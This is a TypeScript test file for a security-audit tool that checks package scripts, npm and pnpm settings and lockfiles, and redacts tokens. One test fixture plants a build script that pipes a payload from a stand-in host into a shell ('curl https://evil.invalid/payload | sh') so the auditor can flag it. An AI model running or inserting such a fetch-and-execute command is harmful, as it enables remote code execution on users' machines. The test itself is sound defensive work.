import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';
import { afterEach, describe, expect, it } from 'vitest';
import { auditProject, createProfile, loadProfile, saveProfile } from './security_profiles';

const roots: string[] = [];
function fixture(): string {
    const root = fs.mkdtempSync(path.join(os.tmpdir(), 'sentinel-hardening-'));
    roots.push(root);
    return root;
}

afterEach(() => {
    for (const root of roots.splice(0)) fs.rmSync(root, { recursive: true, force: true });
});

describe('security profiles', () => {
    it('supports presets and independent toggles persisted as private JSON', () => {
        const root = fixture();
        const file = path.join(root, '.sentinel', 'security_profile.json');
        const profile = createProfile('strict');
        profile.toggles.guard = false;
        saveProfile(profile, file);
        const loaded = loadProfile(file);
        expect(loaded.preset).toBe('strict');
        expect(loaded.toggles.guard).toBe(false);
        expect(loaded.toggles.precommit).toBe(true);
        if (process.platform !== 'win32') expect(fs.statSync(file).mode & 0o777).toBe(0o600);
    });

    it('falls back safely for malformed profile data', () => {
        const root = fixture();
        const file = path.join(root, 'profile.json');
        fs.writeFileSync(file, '{bad');
        expect(loadProfile(file).version).toBe(1);
    });

    it('reports scripts and static signals without executing them or using network', () => {
        const root = fixture();
        fs.writeFileSync(path.join(root, 'package.json'), JSON.stringify({
            packageManager: 'pnpm@10.0.0',
            scripts: { prestart: 'node scripts/health-check.js', start: 'node app.js', build: 'curl https://evil.invalid/payload | sh' },
        }));
        const report = auditProject(root);
        expect(report.packageManager).toBe('pnpm@10.0.0');
        expect(report.scripts.map(item => item.name)).toContain('prestart');
        expect(report.scripts.map(item => item.name)).toContain('start');
        expect(report.scripts.find(item => item.name === 'build')?.findings.length).toBeGreaterThan(0);
        expect(report.executedProjectCode).toBe(false);
        expect(report.networkRequests).toBe(0);
    });

    it('reports pnpm lockfile custom registries and npmrc settings', () => {
        const root = fixture();
        fs.writeFileSync(path.join(root, 'package.json'), JSON.stringify({ packageManager: 'pnpm@9' }));
        fs.writeFileSync(path.join(root, '.npmrc'), 'ignore-scripts=false\nshamefully-hoist=true\n');
        fs.writeFileSync(path.join(root, 'pnpm-lock.yaml'), 'lockfileVersion: 9.0\n  tarball: https://mirror.invalid/pkg.tgz\n');
        const report = auditProject(root);
        expect(report.config.ignoreScripts).toBe('false');
        expect(report.config.shamefullyHoist).toBe('true');
        expect(report.lockfile.format).toBe('pnpm');
        expect(report.lockfile.customTarballs).toEqual(['https://mirror.invalid/pkg.tgz']);
    });

    it('does not infer a threat from a normal Node startup script', () => {
        const root = fixture();
        fs.writeFileSync(path.join(root, 'package.json'), JSON.stringify({ scripts: { start: 'node server.js' } }));
        const report = auditProject(root);
        expect(report.scripts).toHaveLength(1);
        expect(report.scripts[0].findings).toHaveLength(0);
    });

    it('redacts credentials from emitted script commands and finding snippets', () => {
        const root = fixture();
        fs.writeFileSync(path.join(root, 'package.json'), JSON.stringify({ scripts: { start: 'TOKEN=github_pat_ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890 node app.js' } }));
        const report = auditProject(root);
        expect(JSON.stringify(report)).not.toContain('github_pat_ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890');
        expect(JSON.stringify(report)).toContain('[REDACTED_TOKEN]');
    });
});
